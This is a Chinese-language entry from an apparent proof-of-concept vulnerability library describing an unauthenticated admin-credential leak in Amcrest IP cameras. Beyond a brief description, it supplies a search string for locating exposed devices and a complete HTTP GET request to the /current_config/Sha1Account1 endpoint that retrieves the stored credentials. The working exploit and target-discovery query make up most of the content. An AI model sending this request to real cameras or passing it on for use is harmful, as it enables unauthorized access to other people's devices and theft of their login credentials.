---
source: "wy876 漏洞文库"
---

# Amcrest IP Camera Web Sha1Account1账号密码泄漏漏洞

### 一、漏洞描述
Amcrest IP Camera Web是Amcrest公司的一款无线IP摄像头，设备允许未经身份验证的攻击者下载管理凭据。

### 二、影响版本
<font style="color:#000000;">Amcrest-IP-Camera-Web</font>

### 三、资产测绘
```plain
"Amcrest"
```


### 四、漏洞复现
```plain
GET /current_config/Sha1Account1 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip
Connection: close
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/aaoz7mqhlml5nepq>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
